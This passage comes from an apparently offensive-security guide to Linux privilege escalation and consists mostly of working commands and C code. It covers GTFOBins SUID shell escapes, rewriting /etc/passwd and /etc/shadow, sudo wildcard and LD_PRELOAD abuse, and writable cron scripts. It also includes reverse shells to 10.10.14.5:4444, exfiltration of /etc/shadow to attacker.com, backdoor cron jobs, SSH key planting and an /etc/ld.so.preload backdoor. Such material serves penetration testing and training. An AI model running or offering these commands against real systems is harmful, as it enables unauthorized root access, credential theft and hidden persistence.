# Find all SUID binaries
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SUID binaries owned by root
find / -uid 0 -perm -4000 -type f 2>/dev/null

# More detailed output
find / -perm -4000 -ls 2>/dev/null

# Find SGID binaries (Set Group ID)
find / -perm -2000 -type f 2>/dev/null

# Find both SUID and SGID
find / -perm -6000 -type f 2>/dev/null
```

#### GTFOBins SUID Exploitation

GTFOBins documents how Unix binaries can be exploited for privilege escalation. Common SUID binaries:

**nmap (older versions)**

```bash
# Interactive mode (nmap < 5.21)
nmap --interactive
!sh
# Spawns root shell
```

**find**

```bash
find . -exec /bin/sh -p \; -quit
# -p preserves SUID privileges
```

**vim/vi**

```bash
vim -c ':!/bin/sh'
# Or within vim
:set shell=/bin/sh
:shell
```

**awk**

```bash
awk 'BEGIN {system("/bin/sh")}'
```

**perl**

```bash
perl -e 'exec "/bin/sh";'
```

**python**

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**less/more**

```bash
less /etc/passwd
!/bin/sh
```

**cp (copy to overwrite files)**

```bash
# Copy malicious content to /etc/passwd
LFILE=/etc/passwd
echo 'root2::0:0:root:/root:/bin/bash' | cp /dev/stdin "$LFILE"
```

**tar**

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**systemctl**

```bash
# Create malicious service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > /tmp/priv.service

# Enable and start
systemctl enable /tmp/priv.service
systemctl start priv

# Get root shell
/bin/bash -p
```

#### Custom SUID Binary Exploitation

**Analyzing SUID binaries:**

```bash
# Check binary capabilities
getcap /usr/bin/suspicious_binary

# Examine with strings
strings /usr/bin/suspicious_binary

# Check for system calls
strace /usr/bin/suspicious_binary 2>&1 | grep -i exec

# Check library dependencies
ldd /usr/bin/suspicious_binary

# Disassemble
objdump -d /usr/bin/suspicious_binary
```

**Path Hijacking:**

When SUID binary uses relative paths:

```bash
# If binary calls "service" without full path
echo '/bin/sh' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# Execute vulnerable SUID binary
/usr/local/bin/vulnerable_suid_binary
```

**Shared Library Hijacking:**

```bash
# Check if binary uses LD_PRELOAD or LD_LIBRARY_PATH
ldd /usr/local/bin/suid_binary

# Create malicious library
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

# Compile
gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c

# Run with library preload (if enabled)
LD_PRELOAD=/tmp/evil.so /usr/local/bin/suid_binary
```

**Environment Variable Exploitation:**

```bash
# If SUID binary uses relative paths
function /usr/sbin/service() { /bin/bash -p; }
export -f /usr/sbin/service

# Execute vulnerable binary
/usr/local/bin/vulnerable_binary
```

#### SUID Binary Creation for Persistence

```bash
# Create SUID shell (after gaining root)
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash

# Execute later for root access
/tmp/rootbash -p
```

### Writable /etc/passwd or /etc/shadow

Direct modification of authentication files provides immediate root access when write permissions are misconfigured.

#### Understanding /etc/passwd Structure

Format: `username:password:UID:GID:comment:home:shell`

```bash
# Check if writable
ls -la /etc/passwd
test -w /etc/passwd && echo "Writable!"

# View current contents
cat /etc/passwd | grep root
```

#### Exploiting Writable /etc/passwd

**Method 1: Add new root user**

```bash
# Generate password hash
openssl passwd -1 -salt salt password123
# Output: $1$salt$qbvDaHN9.gH.RYhGx7Lq9/

# Add new root user
echo 'hacker:$1$salt$qbvDaHN9.gH.RYhGx7Lq9/:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su hacker
# Password: password123
```

**Method 2: Remove root password**

```bash
# Edit /etc/passwd directly
sed -i 's/root:x:/root::/g' /etc/passwd

# Now su to root without password
su root
```

**Method 3: Change existing user to UID 0**

```bash
# Change your user's UID to 0
sed -i 's/username:x:1000:/username:x:0:/g' /etc/passwd

# Now your user has root privileges
id
# uid=0(root) gid=1000(username)
```

**Method 4: Using Python**

```bash
python -c 'import crypt; print(crypt.crypt("password123", "$6$salt"))'

echo 'hacker2:$6$salt$hash:0:0::/root:/bin/bash' >> /etc/passwd
```

#### Understanding /etc/shadow Structure

Format: `username:password_hash:last_change:min:max:warn:inactive:expire:`

```bash
# Check if writable
ls -la /etc/shadow
test -w /etc/shadow && echo "Writable!"

# View shadow file (requires privileges)
cat /etc/shadow | grep root
```

#### Exploiting Writable /etc/shadow

**Method 1: Replace root password hash**

```bash
# Generate SHA-512 hash
mkpasswd -m sha-512 password123
# Or: python -c 'import crypt; print(crypt.crypt("password123", crypt.mksalt(crypt.METHOD_SHA512)))'

# Replace root's password hash in /etc/shadow
sed -i 's|root:\$6\$.*:|root:NEW_HASH_HERE:|' /etc/shadow

# Su to root
su root
# Password: password123
```

**Method 2: Remove root password**

```bash
# Replace root's hash with empty or *
sed -i 's/root:[^:]*:/root::/' /etc/shadow

# Su without password
su root
```

**Method 3: Copy existing hash**

```bash
# Copy your user's password hash
grep your_username /etc/shadow

# Replace root's hash with yours
sed -i 's|root:\$6\$old_hash|root:\$6\$your_hash|' /etc/shadow

# Su with your password
su root
```

#### Hash Generation Methods

```bash
# MD5 (older, insecure)
openssl passwd -1 password123

# SHA-256
mkpasswd -m sha-256 password123

# SHA-512 (recommended)
mkpasswd -m sha-512 password123
python3 -c 'import crypt; print(crypt.crypt("password123"))'

# With specific salt
python3 -c 'import crypt; print(crypt.crypt("password123", "$6$mysalt$"))'
```

#### Checking Write Permissions

```bash
# Comprehensive check
ls -la /etc/passwd /etc/shadow

# Test write access
echo "test" >> /etc/passwd 2>/dev/null && echo "passwd writable" || echo "passwd not writable"
echo "test" >> /etc/shadow 2>/dev/null && echo "shadow writable" || echo "shadow not writable"

# Check ownership and permissions
stat /etc/passwd
stat /etc/shadow
```

### Sudo Misconfiguration

Sudo misconfigurations are among the most common privilege escalation vectors. They occur when sudo rules grant excessive permissions without proper restrictions.

#### Enumerating Sudo Permissions

```bash
# List allowed sudo commands
sudo -l

# Detailed output with defaults
sudo -ll

# Check sudo version (for vulnerability checks)
sudo -V

# Check if passwordless sudo exists
grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/ 2>/dev/null
```

#### NOPASSWD Exploitation

When commands can run without password authentication:

**Direct Shell Commands**

```bash
# If allowed: sudo NOPASSWD: /bin/bash
sudo /bin/bash

# If allowed: sudo NOPASSWD: /bin/sh
sudo /bin/sh

# If allowed: sudo NOPASSWD: ALL
sudo su
```

**Command Injection via Allowed Binaries**

```bash
# If allowed: sudo NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# If allowed: sudo NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'

# If allowed: sudo NOPASSWD: /usr/bin/less
sudo less /etc/passwd
!/bin/sh

# If allowed: sudo NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/sh")}'

# If allowed: sudo NOPASSWD: /usr/bin/perl
sudo perl -e 'exec "/bin/sh";'

# If allowed: sudo NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/sh")'

# If allowed: sudo NOPASSWD: /usr/bin/wget
sudo wget --post-file=/etc/shadow http://attacker.com/
```

#### Wildcard Exploitation

Wildcards in sudo rules can be exploited through argument injection:

**Example 1: File Path Wildcards**

```bash
# Sudo rule: user ALL=(root) NOPASSWD: /usr/bin/find /home/user/* -exec cat {} \;

# Create malicious directory
cd /home/user
mkdir -- "-exec sh -p \\;"

# Execute sudo command
sudo find /home/user/* -exec cat {} \;
# Spawns root shell
```

**Example 2: tar Wildcards**

```bash
# Sudo rule: (root) NOPASSWD: /bin/tar -czf /tmp/backup.tar.gz *

# Create checkpoint action
cd /home/user
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > shell.sh

# Run sudo command
sudo /bin/tar -czf /tmp/backup.tar.gz *

# Execute SUID bash
/tmp/rootbash -p
```

**Example 3: rsync Wildcards**

```bash
# Sudo rule: (root) NOPASSWD: /usr/bin/rsync *

# Create malicious rsync options
echo "payload" > "-e sh exploit.sh"
echo '#!/bin/bash\nchmod +s /bin/bash' > exploit.sh

# Run sudo rsync
sudo /usr/bin/rsync *
/bin/bash -p
```

#### Sudo Path Manipulation

**Environment Variable Exploitation:**

```bash
# Check if env_keep includes PATH
sudo -l
# Look for: env_keep+=PATH

# Create malicious binary
echo '#!/bin/bash\n/bin/bash -p' > /tmp/ls
chmod +x /tmp/ls

# Modify PATH and execute
sudo PATH=/tmp:$PATH ls
```

**LD_PRELOAD Exploitation:**

```bash
# Check if LD_PRELOAD is preserved
sudo -l
# Look for: env_keep+=LD_PRELOAD

# Create malicious library
cat > /tmp/preload.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF

# Compile
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles

# Execute with LD_PRELOAD
sudo LD_PRELOAD=/tmp/preload.so find
```

**LD_LIBRARY_PATH Exploitation:**

```bash
# Check if preserved
sudo -l | grep LD_LIBRARY_PATH

# Find shared library used by allowed command
ldd /usr/sbin/apache2 | grep libcrypt

# Create malicious library
cat > /tmp/libcrypt.c << EOF
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    system("/bin/bash -p");
}
EOF

# Compile
gcc -shared -fPIC -o /tmp/libcrypt.so.1 /tmp/libcrypt.c

# Execute
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
```

#### Sudo Command Bypasses

**Shell Escapes:**

```bash
# If sudo /usr/bin/vi allowed
sudo vi
:set shell=/bin/sh
:shell

# If sudo /usr/bin/man allowed
sudo man man
!/bin/sh

# If sudo /usr/bin/git allowed
sudo git help status
!/bin/sh
```

**Argument Injection:**

```bash
# If sudo /usr/bin/cat /var/log/apache2/* allowed
sudo /usr/bin/cat /var/log/apache2/../../../etc/shadow

# If sudo /usr/bin/cp allowed
sudo /usr/bin/cp /bin/bash /tmp/rootbash
sudo /usr/bin/cp /dev/null /tmp/rootbash
# [Unverified: Overwrite behavior depends on implementation]
```

#### CVE-2019-14287 (Sudo < 1.8.28)

Bypass user restrictions using UID -1:

```bash
# Check sudo version
sudo -V | grep "Sudo version"

# If vulnerable and rule exists like:
# user ALL=(ALL, !root) NOPASSWD: /bin/bash

# Exploit with UID -1 (translates to UID 0)
sudo -u#-1 /bin/bash
```

#### CVE-2021-3156 (Baron Samedit)

Heap-based buffer overflow in sudo < 1.9.5p2:

```bash
# Check vulnerability
sudoedit -s /
# If output contains "sudoedit:", likely vulnerable

# Download and compile exploit
wget https://github.com/blasty/CVE-2021-3156/raw/main/exploit.c
gcc exploit.c -o exploit

# Run exploit
./exploit
```

#### Automated Enumeration

```bash
# Using LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash

# Manual sudo checks
sudo -l 2>/dev/null
cat /etc/sudoers 2>/dev/null
find /etc/sudoers.d/ -type f 2>/dev/null -exec cat {} \;
```

---

### Cron Job Abuse (Writable Scripts)

Cron jobs executing with elevated privileges that reference writable scripts provide direct privilege escalation paths when user-controlled code runs in privileged contexts.

**Identifying Vulnerable Cron Jobs**

Enumerate system-wide and user-specific cron configurations:

```bash
# System-wide cron jobs
cat /etc/crontab
ls -la /etc/cron.*
ls -la /etc/cron.d/

# User-specific cron jobs (requires access to user's crontab)
crontab -l
for user in $(cut -d: -f1 /etc/passwd); do 
    echo "=== Crontab for $user ==="
    crontab -u $user -l 2>/dev/null
done

# Running cron jobs from process list
ps aux | grep cron
pspy64 -pf -i 1000  # Monitor for cron execution in real-time
```

**Analyzing Cron Job Scripts for Write Permissions**

```bash
# Extract script paths from crontab
grep -v "^#" /etc/crontab | awk '{print $7}' | sort -u > cron_scripts.txt

# Check permissions on all discovered scripts
while read script; do
    if [ -f "$script" ]; then
        perms=$(ls -la "$script")
        echo "$perms"
        
        # Check if writable by current user
        if [ -w "$script" ]; then
            echo "[!] WRITABLE: $script"
        fi
    fi
done < cron_scripts.txt

# Find all scripts referenced in cron directories
find /etc/cron* -type f -exec grep -H "^[^#]" {} \; | \
    grep -oP '/[^ ]+\.sh' | sort -u | while read script; do
    [ -w "$script" ] && echo "[!] Writable cron script: $script"
done
```

**Automated Cron Job Discovery**

```bash
#!/bin/bash
# cron_privesc_checker.sh

echo "[*] Checking for writable cron jobs..."

# Check /etc/crontab
if [ -r /etc/crontab ]; then
    echo "[+] Analyzing /etc/crontab"
    grep -v "^#\|^$" /etc/crontab | while read line; do
        # Extract potential script paths
        script=$(echo "$line" | grep -oP '/[^ ]+\.(sh|py|pl|rb)')
        if [ -n "$script" ] && [ -f "$script" ]; then
            if [ -w "$script" ]; then
                echo "[!!!] EXPLOITABLE: $script is writable"
                echo "     Cron entry: $line"
            fi
        fi
        
        # Check directory permissions for scripts
        dir=$(echo "$line" | grep -oP '/[^ ]+/' | head -1)
        if [ -n "$dir" ] && [ -d "$dir" ]; then
            if [ -w "$dir" ]; then
                echo "[!!] Directory $dir is writable (script injection possible)"
            fi
        fi
    done
fi

# Check cron.d directory
for cronfile in /etc/cron.d/*; do
    [ -f "$cronfile" ] && grep -v "^#\|^$" "$cronfile" | while read line; do
        script=$(echo "$line" | grep -oP '/[^ ]+\.(sh|py|pl|rb)')
        [ -n "$script" ] && [ -w "$script" ] && \
            echo "[!!!] EXPLOITABLE: $cronfile -> $script is writable"
    done
done

# Check for writable directories in PATH used by cron
echo "[*] Checking PATH directories used by cron..."
grep "PATH=" /etc/crontab | cut -d'=' -f2 | tr ':' '\n' | while read dir; do
    if [ -d "$dir" ] && [ -w "$dir" ]; then
        echo "[!!] Writable directory in cron PATH: $dir"
    fi
done
```

**Exploitation Techniques**

**Direct Script Modification**

When the cron job script is directly writable:

```bash
# Identify writable cron script
CRON_SCRIPT="/usr/local/bin/backup.sh"

# Verify it's running as root
grep "$CRON_SCRIPT" /etc/crontab
# Output: */5 * * * * root /usr/local/bin/backup.sh

# Check write permissions
ls -la $CRON_SCRIPT
# Output: -rwxrwxr-x 1 root users 145 Oct 10 10:00 /usr/local/bin/backup.sh

# Backup original script
cp $CRON_SCRIPT ${CRON_SCRIPT}.bak

# Method 1: Append reverse shell
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> $CRON_SCRIPT

# Method 2: Add SUID binary creation
cat >> $CRON_SCRIPT << 'EOF'
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
EOF

# Method 3: Add SSH key for root
cat >> $CRON_SCRIPT << 'EOF'
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
EOF

# Wait for cron execution (check timing from /etc/crontab)
# Then execute spawned shell
/tmp/rootbash -p  # Preserves privileges
```

**Script Injection via Writable Directory**

When the directory containing the script is writable but not the script itself:

```bash
# Cron executes: /opt/scripts/cleanup.sh
# Directory /opt/scripts is writable

# Create malicious script with same name
cat > /tmp/cleanup.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
EOF

chmod +x /tmp/cleanup.sh

# Replace original with symlink to malicious script
mv /opt/scripts/cleanup.sh /opt/scripts/cleanup.sh.bak
ln -s /tmp/cleanup.sh /opt/scripts/cleanup.sh

# Wait for cron execution
watch -n 1 'ls -la /tmp/rootbash 2>/dev/null'
```

**Wildcard Injection in Cron Scripts**

[Inference] When cron scripts use wildcards with commands like `tar`, `rsync`, or `chown`, command injection may be possible:

```bash
# Vulnerable cron job
# */5 * * * * root cd /tmp && tar czf /backup/backup.tar.gz *

# Create malicious files exploiting tar's checkpoint feature
cd /tmp
echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > shell.sh
chmod +x shell.sh

# Create checkpoint action files
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# Wait for cron execution
ls -la /tmp/rootbash

# Alternative with rsync
# Cron: */5 * * * * root rsync -a /home/user/* /backup/

# Exploitation
echo 'chmod +s /bin/bash' > exploit.sh
chmod +x exploit.sh
touch -- '-e sh exploit.sh'  # rsync -e option
```

**Exploiting Cron Environment Variables**

Scripts that rely on relative paths or environment variables:

```bash
# Vulnerable cron entry (no absolute paths)
# */10 * * * * root backup.sh

# Check cron's PATH
grep PATH /etc/crontab
# Output: PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Create malicious script in writable PATH directory
cat > /usr/local/bin/backup.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
EOF

chmod +x /usr/local/bin/backup.sh

# Wait for execution
```

**Real-Time Cron Monitoring with pspy**

```bash
# Download and execute pspy
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64

# Monitor processes (catches cron jobs as they execute)
./pspy64 -pf -i 1000

# Example output showing cron execution:
# 2024/10/11 10:05:01 CMD: UID=0    PID=12345  | /bin/bash /usr/local/bin/backup.sh
# 2024/10/11 10:05:01 CMD: UID=0    PID=12346  | tar czf /backup/files.tar.gz /home

# Identify:
# - Which scripts run as root (UID=0)
# - Timing patterns
# - Scripts with writable permissions
```

**Persistence via Cron After Initial Access**

```bash
# Add backdoor cron job (requires write to cron directories)
echo '*/5 * * * * root bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"' > /etc/cron.d/backdoor

# Alternative: User crontab (no root required)
(crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/.hidden/callback.sh') | crontab -

# Callback script
cat > /tmp/.hidden/callback.sh << 'EOF'
#!/bin/bash
while true; do
    bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
    sleep 600
done
EOF

chmod +x /tmp/.hidden/callback.sh
```

### PATH Variable Manipulation

PATH variable manipulation exploits scripts or binaries that execute commands using relative paths rather than absolute paths, allowing execution of attacker-controlled binaries.

**Understanding PATH Priority**

```bash
# Display current PATH
echo $PATH
# Output: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# PATH is searched left-to-right
# First matching binary is executed

# Check if directories in PATH are writable
echo $PATH | tr ':' '\n' | while read dir; do
    [ -d "$dir" ] && [ -w "$dir" ] && echo "[!] Writable: $dir"
done
```

**Identifying SUID Binaries with Relative Paths**

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check SUID binaries for relative path execution
for binary in $(find / -perm -4000 -type f 2>/dev/null); do
    strings "$binary" | grep -v "^/" | grep -E "(sh|bash|nc|curl|wget)" && \
        echo "[*] Potential relative path in: $binary"
done

# Use ltrace to identify system calls
ltrace /usr/local/bin/suid_binary 2>&1 | grep -E "system|exec"
# Look for: system("command") instead of system("/full/path/command")

# Use strace to monitor execution
strace -f -e trace=execve /usr/local/bin/suid_binary 2>&1 | grep execve
```

**SUID Binary PATH Exploitation**

```bash
# Example: SUID binary executes "service" without absolute path
# File: /usr/local/bin/suid_service_manager
ls -la /usr/local/bin/suid_service_manager
# Output: -rwsr-xr-x 1 root root 8392 Oct 10 10:00 /usr/local/bin/suid_service_manager

# Verify it uses relative path
strings /usr/local/bin/suid_service_manager | grep service
# Output: service apache2 restart

# Create malicious "service" binary
cat > /tmp/service << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
EOF

chmod +x /tmp/service

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Execute SUID binary (will run our malicious "service")
/usr/local/bin/suid_service_manager

# Execute root shell
/tmp/rootbash -p
```

**Function Hijacking in Shell Scripts**

When SUID shell scripts call functions or commands:

```bash
# Vulnerable SUID script calls "ls" command
cat /usr/local/bin/suid_script.sh
#!/bin/bash
# Script content:
# ls -la /root

# Create malicious function (Bash functions take precedence)
function /usr/bin/ls() {
    cp /bin/bash /tmp/rootbash
    chmod +xs /tmp/rootbash
}
export -f /usr/bin/ls

# Execute script
/usr/local/bin/suid_script.sh
```

**Sudo PATH Manipulation**

When sudo preserves PATH or allows specific commands via relative paths:

```bash
# Check sudo configuration
sudo -l
# Output: User may run: (root) NOPASSWD: /usr/local/scripts/backup.sh

# Check if script uses relative paths
cat /usr/local/scripts/backup.sh
# Contains: tar czf backup.tar.gz *

# Create malicious tar binary
cat > /tmp/tar << 'EOF'
#!/bin/bash
/bin/bash
EOF

chmod +x /tmp/tar

# Exploit with modified PATH
sudo PATH=/tmp:$PATH /usr/local/scripts/backup.sh
```

**Automated PATH Vulnerability Scanner**

```bash
#!/bin/bash
# path_privesc_scanner.sh

echo "[*] Scanning for PATH-based privilege escalation vectors..."

# Check for writable directories in PATH
echo "[*] Checking writable PATH directories..."
IFS=':' read -ra PATHS <<< "$PATH"
for dir in "${PATHS[@]}"; do
    if [ -d "$dir" ] && [ -w "$dir" ]; then
        echo "[!!] Writable PATH directory: $dir"
    fi
done

# Find SUID binaries and check for relative paths
echo "[*] Analyzing SUID binaries for relative path usage..."
find / -perm -4000 -type f 2>/dev/null | while read suid_bin; do
    # Skip if we can't read it
    [ ! -r "$suid_bin" ] && continue
    
    # Extract strings and look for potential commands
    strings "$suid_bin" | grep -v "^/" | \
        grep -E "^(ls|cat|echo|ps|id|whoami|service|systemctl|sh|bash)$" | \
        while read cmd; do
            echo "[!] $suid_bin may execute: $cmd (relative path)"
        done
done

# Check sudo permissions for scripts with relative paths
echo "[*] Checking sudo-allowed scripts..."
sudo -l 2>/dev/null | grep "NOPASSWD" | grep -oP '/[^ ]+' | \
    while read script; do
        [ -r "$script" ] && grep -q '[^/][a-z]*' "$script" && \
            echo "[!] Sudo script with potential relative paths: $script"
    done
```

**Exploiting Scripts that Reset PATH**

Some scripts set PATH but still have vulnerabilities:

```bash
# Script content:
#!/bin/bash
PATH=/usr/local/bin:/usr/bin:/bin
service apache2 restart

# Exploitation via current directory
cd /tmp
cat > service << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
EOF

chmod +x service

# If script is executed from current directory
cd /tmp
/usr/local/bin/vulnerable_script.sh

# Alternative: If PATH includes current directory (.)
export PATH=.:$PATH
/usr/local/bin/vulnerable_script.sh
```

**Python Library Path Manipulation**

Python scripts that import modules without absolute paths:

```bash
# Vulnerable Python script (SUID)
cat /usr/local/bin/script.py
#!/usr/bin/python3
import backup
backup.run()

# Check Python path
python3 -c "import sys; print('\n'.join(sys.path))"

# Create malicious module in writable location
cat > /tmp/backup.py << 'EOF'
import os
os.system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash')
def run():
    pass
EOF

# Execute with modified PYTHONPATH
PYTHONPATH=/tmp /usr/local/bin/script.py
```

### Library Hijacking (LD_PRELOAD, LD_LIBRARY_PATH)

Library hijacking exploits the dynamic linker's library loading mechanism to execute attacker-controlled code through shared library injection.

**LD_PRELOAD Exploitation Basics**

LD_PRELOAD forces the dynamic linker to load specified libraries before all others, allowing function interception:

```bash
# Check if LD_PRELOAD is honored
sudo -l
# Look for: env_keep+=LD_PRELOAD

# Verify LD_PRELOAD works
LD_PRELOAD=/lib/x86_64-linux-gnu/libc.so.6 id
# If command executes, LD_PRELOAD is functional
```

**Creating Malicious Shared Library**

```c
// shell.c - Hijack shared library function
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

// Constructor executes before main()
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    setresgid(0,0,0);
    system("/bin/bash -p");
}
```

Compile the malicious library:

```bash
# Compile as shared library
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c

# Verify it's a valid shared library
file /tmp/shell.so
# Output: ELF 64-bit LSB shared object

# Test locally
LD_PRELOAD=/tmp/shell.so id
```

**LD_PRELOAD with SUID Binaries**

[Unverified] Modern Linux systems typically ignore LD_PRELOAD for SUID binaries unless specific conditions are met:

```bash
# This generally does NOT work on modern systems
LD_PRELOAD=/tmp/shell.so /usr/bin/suid_binary

# However, if SUID binary explicitly allows it
sudo -l
# Output: env_keep+=LD_PRELOAD

# Then exploitation works
sudo LD_PRELOAD=/tmp/shell.so apache2
```

**Function Hijacking with LD_PRELOAD**

Intercept specific library functions:

```c
// hijack_printf.c - Intercept printf calls
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <unistd.h>

// Function pointer for original printf
static int (*original_printf)(const char *format, ...) = NULL;

// Override printf
int printf(const char *format, ...) {
    // Escalate privileges
    setuid(0);
    setgid(0);
    
    // Execute shell
    system("/bin/bash -p");
    
    // Call original printf (optional)
    if (!original_printf) {
        original_printf = dlsym(RTLD_NEXT, "printf");
    }
    return original_printf(format);
}
```

Compile and use:

```bash
gcc -fPIC -shared -o /tmp/hijack.so hijack_printf.c -ldl

# Use against programs that call printf
LD_PRELOAD=/tmp/hijack.so /usr/local/bin/vulnerable_program
```

**LD_LIBRARY_PATH Exploitation**

LD_LIBRARY_PATH specifies directories to search for shared libraries before default locations:

```bash
# Find programs that load specific libraries
ldd /usr/local/bin/custom_program
# Output:
#   libcustom.so.1 => /usr/local/lib/libcustom.so.1
#   libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6

# Check if SUID binary uses custom libraries
find / -perm -4000 -type f 2>/dev/null | while read binary; do
    ldd "$binary" 2>/dev/null | grep -v "=>" | grep "\.so" && \
        echo "[*] $binary has potentially hijackable libraries"
done
```

**Creating Hijacked Library**

```c
// fake_libcustom.c - Malicious library replacement
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Mimic expected function but execute malicious code
void expected_function() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}

// Library initialization
__attribute__((constructor))
void init() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash");
}
```

Compile and exploit:

```bash
# Compile with same name as legitimate library
gcc -fPIC -shared -o /tmp/libcustom.so.1 fake_libcustom.c

# Set LD_LIBRARY_PATH to prioritize our directory
export LD_LIBRARY_PATH=/tmp:$LD_LIBRARY_PATH

# Execute SUID binary (if it doesn't ignore LD_LIBRARY_PATH)
/usr/local/bin/custom_program

# Execute created root shell
/tmp/rootbash -p
```

**Identifying Hijackable Libraries**

```bash
#!/bin/bash
# library_hijack_scanner.sh

echo "[*] Scanning for library hijacking opportunities..."

# Find SUID binaries
for suid_binary in $(find / -perm -4000 -type f 2>/dev/null); do
    echo "[*] Analyzing: $suid_binary"
    
    # Get library dependencies
    ldd "$suid_binary" 2>/dev/null | while read line; do
        # Extract library path
        lib_path=$(echo "$line" | grep -oP '=>\s+\K[^ ]+')
        
        if [ -n "$lib_path" ]; then
            lib_dir=$(dirname "$lib_path")
            
            # Check if library directory is writable
            if [ -w "$lib_dir" ]; then
                echo "[!!] Writable library directory: $lib_dir"
                echo "    Binary: $suid_binary"
                echo "    Library: $lib_path"
            fi
            
            # Check if library itself is writable
            if [ -w "$lib_path" ]; then
                echo "[!!!] Writable library: $lib_path"
                echo "     Used by: $suid_binary"
            fi
        fi
        
        # Check for missing libraries (not found)
        if echo "$line" | grep -q "not found"; then
            lib_name=$(echo "$line" | awk '{print $1}')
            echo "[!] Missing library: $lib_name"
            echo "   Required by: $suid_binary"
            echo "   Can be provided via LD_LIBRARY_PATH"
        fi
    done
done

# Check for writable /etc/ld.so.conf.d/
if [ -w /etc/ld.so.conf.d/ ]; then
    echo "[!!!] /etc/ld.so.conf.d/ is writable!"
    echo "     Can inject library search paths"
fi
```

**RPATH/RUNPATH Exploitation**

Programs with RPATH or RUNPATH settings may search custom directories:

```bash
# Check if binary has RPATH/RUNPATH
readelf -d /usr/local/bin/program | grep -E "RPATH|RUNPATH"
# Output: 0x000000000000000f (RPATH) Library rpath: [/usr/local/custom/lib]

# Check if RPATH directory is writable
RPATH_DIR=$(readelf -d /usr/local/bin/program | grep RPATH | grep -oP '\[.*\]' | tr -d '[]')

if [ -w "$RPATH_DIR" ]; then
    echo "[!!] Writable RPATH directory: $RPATH_DIR"
    
    # Create malicious library
    gcc -fPIC -shared -o "$RPATH_DIR/libvuln.so" malicious.c
fi
```

**Hijacking via /etc/ld.so.preload**

Persistent LD_PRELOAD configuration:

```bash
# Check if /etc/ld.so.preload is writable
ls -la /etc/ld.so.preload 2>/dev/null

# If writable, add malicious library
echo "/tmp/evil.so" > /etc/ld.so.preload

# Now all dynamically linked programs will load evil.so
# Create persistent backdoor
cat > /tmp/evil.c << 'EOF'
#include <unistd.h>
#include <sys/types.h>

__attribute__((constructor))
void init() {
    if (getuid() == 0) {
        system("cp /bin/bash /tmp/.rootshell; chmod +xs /tmp/.rootshell");
    }
}
EOF

gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c
```

**Advanced Library Hijacking with Symbol Interposition**

```c
// symbol_interpose.c - Advanced function interposition
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Intercept geteuid() to always return 0 (root)
uid_t geteuid(void) {
    return 0;
}

// Intercept getuid() to always return 0
uid_t getuid(void) {
    return 0;
}

// Intercept access() for file permission checks
int access(const char *pathname, int mode) {
    // Always return success
    return 0;
}

// Intercept open() to redirect file access
int open(const char *pathname, int flags, ...) {
    static int (*original_open)(const char*, int, ...) = NULL;
    
